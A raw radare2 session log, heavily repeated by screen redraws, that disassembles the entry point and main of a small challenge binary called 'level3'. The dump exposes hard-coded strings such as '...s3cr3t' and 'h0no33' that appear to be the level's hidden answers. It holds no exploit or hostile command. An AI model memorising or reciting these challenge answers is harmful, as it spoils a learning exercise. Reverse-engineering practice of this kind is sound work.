                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5


                                      .------------------------------------------------------------------------------.
                                      | [0x80484b0] ;[gb]                                                            |
                                      |      ; section 14 va=0x080484b0 pa=0x000004b0 sz=770 vsz=770 rwx=--r-x .text |
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5







                                      .------------------------------------------------------------------------------.
                                      | [0x80484b0] ;[gb]                                                            |
                                      |      ; section 14 va=0x080484b0 pa=0x000004b0 sz=770 vsz=770 rwx=--r-x .text |
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5


                                      .------------------------------------------------------------------------------.
                                      | [0x80484b0] ;[gb]                                                            |
                                      |      ; section 14 va=0x080484b0 pa=0x000004b0 sz=770 vsz=770 rwx=--r-x .text |
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0]> VV @ entry0 (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                      |   ;-- section..text:                                                         |
                                      |   ;-- eip:                                                                   |
                                      | (fcn) entry0 33                                                              |
                                      |   entry0 ();                                                                 |
                                      | xor ebp, ebp                                                                 |
                                      | pop esi                                                                      |
                                      | mov ecx, esp                                                                 |
                                      | and esp, 0xfffffff0                                                          |
                                      | push eax                                                                     |
                                      | push esp                                                                     |
                                      | push edx                                                                     |
                                      |    ; 0x80487b0                                                               |
                                      | push sym.__libc_csu_fini                                                     |
                                      |    ; 0x8048750                                                               |
                                      |    ; "UWVS\xe8\x87\xfd\xff\xff\x81\u00e7\x18"                                |
                                      | push sym.__libc_csu_init                                                     |
                                      | push ecx                                                                     |
                                      | push esi                                                                     |
                                      |    ; sym.main                                                                |
                                      |    ; 0x804867e                                                               |
                                      |    ; "U\x89\xe5\x83\xe4\xf0\x83\xecPe\xa1\x14"                               |
                                      | push main                                                                    |
                                      | call sym.imp.__libc_start_main;[ga]                                          |
                                      `------------------------------------------------------------------------------'
[0x080484b0 11% 2240 level3]> xc @ entry0
- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF  comment
0x080484b0  31ed 5e89 e183 e4f0 5054 5268 b087 0408  1.^.....PTRh....  ; section 14 va=0x080484b0 pa=0x000004b0 sz=770 vsz=770 rwx=--r-x .text
0x080484c0  6850 8704 0851 5668 7e86 0408 e8bf ffff  hP...QVh~.......
0x080484d0  fff4 6690 6690 6690 6690 6690 6690 6690  ..f.f.f.f.f.f.f.
0x080484e0  8b1c 24c3 6690 6690 6690 6690 6690 6690  ..$.f.f.f.f.f.f.
0x080484f0  b843 a004 082d 40a0 0408 83f8 0677 01c3  .C...-@......w..
0x08048500  b800 0000 0085 c074 f655 89e5 83ec 18c7  .......t.U......
0x08048510  0424 40a0 0408 ffd0 c9c3 8db6 0000 0000  .$@.............
0x08048520  b840 a004 082d 40a0 0408 c1f8 0289 c2c1  .@...-@.........
0x08048530  ea1f 01d0 d1f8 7501 c3ba 0000 0000 85d2  ......u.........
0x08048540  74f6 5589 e583 ec18 8944 2404 c704 2440  t.U......D$...$@
0x08048550  a004 08ff d2c9 c389 f68d bc27 0000 0000  ...........'....
0x08048560  803d 44a0 0408 0075 1355 89e5 83ec 08e8  .=D....u.U......
0x08048570  7cff ffff c605 44a0 0408 01c9 f3c3 6690  |.....D.......f.
0x08048580  a110 9f04 0885 c074 1fb8 0000 0000 85c0  .......t........
0x08048590  7416 5589 e583 ec18 c704 2410 9f04 08ff  t.U.......$.....
0x080485a0  d0c9 e979 ffff ff90 e973 ffff ff55 89e5  ...y.....s...U..
0x080485b0  5381 ec24 0100 0065 a114 0000 0089 45f4  S..$...e......E.
0x080485c0  31c0 c785 e9fe ffff 736e 6c70 c785 edfe  1.......snlp....
0x080485d0  ffff 7269 6e74 66c7 85f1 feff ff66 0ac6  ..rintf......f..
0x080485e0  85f3 feff ff00 a140 a004 0889 4424 08c7  .......@....D$..
0x080485f0  4424 0400 0100 008d 85f4 feff ff89 0424  D$.............$
0x08048600  e82b feff ff8d 85e9 feff ff89 4424 048d  .+..........D$..
0x08048610  85f4 feff ff89 0424 e8f3 fdff ff85 c075  .......$.......u
0x08048620  32c7 0424 d087 0408 e833 feff ffe8 1efe  2..$.....3......
0x08048630  ffff 89c3 e817 feff ff89 5c24 0489 0424  ..........\$...$
0x08048640  e83b feff ffc7 0424 e487 0408 e81f feff  .;.....$........
0x08048650  ffeb 0cc7 0424 ec87 0408 e801 feff ffb8  .....$..........
0x08048660  0000 0000 8b55 f465 3315 1400 0000 7405  .....U.e3.....t.
0x08048670  e8cb fdff ff81 c424 0100 005b 5dc3 5589  .......$...[].U.
0x08048680  e583 e4f0 83ec 5065 a114 0000 0089 4424  ......Pe......D$
0x08048690  4c31 c0c7 4424 2362 6f6d 6266 c744 2427  L1..D$#bombf.D$'
0x080486a0  6164 c644 2429 00c7 4424 382e 2e2e 73c7  ad.D$)..D$8...s.
0x080486b0  4424 3c33 6372 3366 c744 2440 7400 c744  D$<3cr3f.D$@t..D
0x080486c0  242a 6830 6e6f 66c7 4424 2e33 33c6 4424  $*h0nof.D$.33.D$
0x080486d0  3000 c744 2431 6b61 6b61 66c7 4424 356b  0..D$1kakaf.D$5k
0x080486e0  61c6 4424 3700 c744 2442 2a33 322e c744  a.D$7..D$B*32..D
0x080486f0  2446 322a 5b78 66c7 4424 4a5d 008d 4424  $F2*[xf.D$J]..D$
0x08048700  3189 4424 048d 4424 2a89 0424 e8ff fcff  1.D$..D$*..$....
[0x080484b0]> s main
[0x0804867e]> VV
[0x0804867e]> VV @ main (nodes 5 edges 5 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5

                                                   .----------------------------------------------------.
                                                   | [0x804867e] ;[gc]                                  |
                                                   |   ;-- main:                                        |
                                                   | (fcn) main 201                                     |
                                                   |   main ();                                         |
                                                   | ; var int local_4h @ esp+0x4                       |
                                                   | ; var int local_1ch @ esp+0x1c                     |
                                                   | ; var int local_23h @ esp+0x23                     |
                                                   | ; var int local_27h @ esp+0x27                     |
                                                   | ; var int local_29h @ esp+0x29                     |
                                                   | ; var int local_2ah @ esp+0x2a                     |
                                                   | ; var int local_2eh @ esp+0x2e                     |
                                                   | ; var int local_30h @ esp+0x30                     |
                                                   | ; var int local_31h @ esp+0x31                     |
                                                   | ; var int local_35h @ esp+0x35                     |
                                                   | ; var int local_37h @ esp+0x37                     |
                                                   | ; var int local_38h @ esp+0x38                     |
                                                   | ; var int local_3ch @ esp+0x3c                     |
                                                   | ; var int local_40h @ esp+0x40                     |
                                                   | ; var int local_42h @ esp+0x42                     |
                                                   | ; var int local_46h @ esp+0x46                     |
                                                   | ; var int local_4ah @ esp+0x4a                     |
                                                   | ; var int local_4ch @ esp+0x4c                     |
                                                   |    ; DATA XREF from 0x080484c7 (entry0)            |
                                                   | push ebp; .//level3.c:25                           |
                                                   | mov ebp, esp                                       |
                                                   | and esp, 0xfffffff0                                |
                                                   |    ; 'P'                                           |
                                                   | sub esp, 0x50                                      |
                                                   |    ; [0x14:4]=-1                                   |
                                                   |    ; 20                                            |
                                                   | mov eax, dword gs:[0x14]                           |
                                                   | mov dword [local_4ch], eax                         |
                                                   | xor eax, eax                                       |
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5

                                                   .----------------------------------------------------.
                                                   | [0x804867e] ;[gc]                                  |
                                                   |   ;-- main:                                        |
                                                   | (fcn) main 201                                     |
                                                   |   main ();                                         |
                                                   | ; var int local_4h @ esp+0x4                       |
                                                   | ; var int local_1ch @ esp+0x1c                     |
                                                   | ; var int local_23h @ esp+0x23                     |
                                                   | ; var int local_27h @ esp+0x27                     |
                                                   | ; var int local_29h @ esp+0x29                     |
                                                   | ; var int local_2ah @ esp+0x2a                     |
                                                   | ; var int local_2eh @ esp+0x2e                     |
                                                   | ; var int local_30h @ esp+0x30                     |
                                                   | ; var int local_31h @ esp+0x31                     |
                                                   | ; var int local_35h @ esp+0x35                     |
                                                   | ; var int local_37h @ esp+0x37                     |
                                                   | ; var int local_38h @ esp+0x38                     |
                                                   | ; var int local_3ch @ esp+0x3c                     |
                                                   | ; var int local_40h @ esp+0x40                     |
                                                   | ; var int local_42h @ esp+0x42                     |
                                                   | ; var int local_46h @ esp+0x46                     |
                                                   | ; var int local_4ah @ esp+0x4a                     |
                                                   | ; var int local_4ch @ esp+0x4c                     |
                                                   |    ; DATA XREF from 0x080484c7 (entry0)            |
                                                   | push ebp; .//level3.c:25                           |
                                                   | mov ebp, esp                                       |
                                                   | and esp, 0xfffffff0                                |
                                                   |    ; 'P'                                           |
                                                   | sub esp, 0x50                                      |
                                                   |    ; [0x14:4]=-1                                   |
                                                   |    ; 20                                            |
                                                   | mov eax, dword gs:[0x14]                           |
                                                   | mov dword [local_4ch], eax                         |
                                                   | xor eax, eax                                       |
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   |   main ();                                         |
                                                   | ; var int local_4h @ esp+0x4                       |
                                                   | ; var int local_1ch @ esp+0x1c                     |
                                                   | ; var int local_23h @ esp+0x23                     |
                                                   | ; var int local_27h @ esp+0x27                     |
                                                   | ; var int local_29h @ esp+0x29                     |
                                                   | ; var int local_2ah @ esp+0x2a                     |
                                                   | ; var int local_2eh @ esp+0x2e                     |
                                                   | ; var int local_30h @ esp+0x30                     |
                                                   | ; var int local_31h @ esp+0x31                     |
                                                   | ; var int local_35h @ esp+0x35                     |
                                                   | ; var int local_37h @ esp+0x37                     |
                                                   | ; var int local_38h @ esp+0x38                     |
                                                   | ; var int local_3ch @ esp+0x3c                     |
                                                   | ; var int local_40h @ esp+0x40                     |
                                                   | ; var int local_42h @ esp+0x42                     |
                                                   | ; var int local_46h @ esp+0x46                     |
                                                   | ; var int local_4ah @ esp+0x4a                     |
                                                   | ; var int local_4ch @ esp+0x4c                     |
                                                   |    ; DATA XREF from 0x080484c7 (entry0)            |
                                                   | push ebp; .//level3.c:25                           |
                                                   | mov ebp, esp                                       |
                                                   | and esp, 0xfffffff0                                |
                                                   |    ; 'P'                                           |
                                                   | sub esp, 0x50                                      |
                                                   |    ; [0x14:4]=-1                                   |
                                                   |    ; 20                                            |
                                                   | mov eax, dword gs:[0x14]                           |
                                                   | mov dword [local_4ch], eax                         |
                                                   | xor eax, eax                                       |
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
                                                   | mov byte [local_29h], 0                            |
                                                   |    ; [0x732e2e2e:4]=-1                             |
                                                   | mov dword [local_38h], 0x732e2e2e; .//level3.c:27  |
                                                   |    ; [0x33726333:4]=-1                             |
                                                   | mov dword [local_3ch], 0x33726333                  |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   | ; var int local_29h @ esp+0x29                     |
                                                   | ; var int local_2ah @ esp+0x2a                     |
                                                   | ; var int local_2eh @ esp+0x2e                     |
                                                   | ; var int local_30h @ esp+0x30                     |
                                                   | ; var int local_31h @ esp+0x31                     |
                                                   | ; var int local_35h @ esp+0x35                     |
                                                   | ; var int local_37h @ esp+0x37                     |
                                                   | ; var int local_38h @ esp+0x38                     |
                                                   | ; var int local_3ch @ esp+0x3c                     |
                                                   | ; var int local_40h @ esp+0x40                     |
                                                   | ; var int local_42h @ esp+0x42                     |
                                                   | ; var int local_46h @ esp+0x46                     |
                                                   | ; var int local_4ah @ esp+0x4a                     |
                                                   | ; var int local_4ch @ esp+0x4c                     |
                                                   |    ; DATA XREF from 0x080484c7 (entry0)            |
                                                   | push ebp; .//level3.c:25                           |
                                                   | mov ebp, esp                                       |
                                                   | and esp, 0xfffffff0                                |
                                                   |    ; 'P'                                           |
                                                   | sub esp, 0x50                                      |
                                                   |    ; [0x14:4]=-1                                   |
                                                   |    ; 20                                            |
                                                   | mov eax, dword gs:[0x14]                           |
                                                   | mov dword [local_4ch], eax                         |
                                                   | xor eax, eax                                       |
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
                                                   | mov byte [local_29h], 0                            |
                                                   |    ; [0x732e2e2e:4]=-1                             |
                                                   | mov dword [local_38h], 0x732e2e2e; .//level3.c:27  |
                                                   |    ; [0x33726333:4]=-1                             |
                                                   | mov dword [local_3ch], 0x33726333                  |
                                                   |    ; 't'                                           |
                                                   |    ; [0x74:2]=0xffff                               |
                                                   |       ; 116                                        |
                                                   | mov word [local_40h], 0x74                         |
                                                   |    ; [0x6f6e3068:4]=-1                             |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   | ; var int local_35h @ esp+0x35                     |
                                                   | ; var int local_37h @ esp+0x37                     |
                                                   | ; var int local_38h @ esp+0x38                     |
                                                   | ; var int local_3ch @ esp+0x3c                     |
                                                   | ; var int local_40h @ esp+0x40                     |
                                                   | ; var int local_42h @ esp+0x42                     |
                                                   | ; var int local_46h @ esp+0x46                     |
                                                   | ; var int local_4ah @ esp+0x4a                     |
                                                   | ; var int local_4ch @ esp+0x4c                     |
                                                   |    ; DATA XREF from 0x080484c7 (entry0)            |
                                                   | push ebp; .//level3.c:25                           |
                                                   | mov ebp, esp                                       |
                                                   | and esp, 0xfffffff0                                |
                                                   |    ; 'P'                                           |
                                                   | sub esp, 0x50                                      |
                                                   |    ; [0x14:4]=-1                                   |
                                                   |    ; 20                                            |
                                                   | mov eax, dword gs:[0x14]                           |
                                                   | mov dword [local_4ch], eax                         |
                                                   | xor eax, eax                                       |
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
                                                   | mov byte [local_29h], 0                            |
                                                   |    ; [0x732e2e2e:4]=-1                             |
                                                   | mov dword [local_38h], 0x732e2e2e; .//level3.c:27  |
                                                   |    ; [0x33726333:4]=-1                             |
                                                   | mov dword [local_3ch], 0x33726333                  |
                                                   |    ; 't'                                           |
                                                   |    ; [0x74:2]=0xffff                               |
                                                   |       ; 116                                        |
                                                   | mov word [local_40h], 0x74                         |
                                                   |    ; [0x6f6e3068:4]=-1                             |
                                                   | mov dword [local_2ah], 0x6f6e3068; .//level3.c:29  |
                                                   |    ; [0x3333:2]=0xffff                             |
                                                   | mov word [local_2eh], 0x3333                       |
                                                   | mov byte [local_30h], 0                            |
                                                   |    ; [0x616b616b:4]=-1                             |
[0x0804867e]> VV @ main (nodes 6 edges 6 zoom 100%) BB-NORM mouse:canvas-y movements-speed:5
                                                   | ; var int local_42h @ esp+0x42                     |
                                                   | ; var int local_46h @ esp+0x46                     |
                                                   | ; var int local_4ah @ esp+0x4a                     |
                                                   | ; var int local_4ch @ esp+0x4c                     |
                                                   |    ; DATA XREF from 0x080484c7 (entry0)            |
                                                   | push ebp; .//level3.c:25                           |
                                                   | mov ebp, esp                                       |
                                                   | and esp, 0xfffffff0                                |
                                                   |    ; 'P'                                           |
                                                   | sub esp, 0x50                                      |
                                                   |    ; [0x14:4]=-1                                   |
                                                   |    ; 20                                            |
                                                   | mov eax, dword gs:[0x14]                           |
                                                   | mov dword [local_4ch], eax                         |
                                                   | xor eax, eax                                       |
                                                   |    ; [0x626d6f62:4]=-1                             |
                                                   | mov dword [local_23h], 0x626d6f62; .//level3.c:26  |
                                                   |    ; [0x6461:2]=0xffff                             |
                                                   | mov word [local_27h], 0x6461                       |
                                                   | mov byte [local_29h], 0                            |
                                                   |    ; [0x732e2e2e:4]=-1                             |
                                                   | mov dword [local_38h], 0x732e2e2e; .//level3.c:27  |
                                                   |    ; [0x33726333:4]=-1                             |
                                                   | mov dword [local_3ch], 0x33726333                  |
                                                   |    ; 't'                                           |
                                                   |    ; [0x74:2]=0xffff                               |
                                                   |       ; 116                                        |
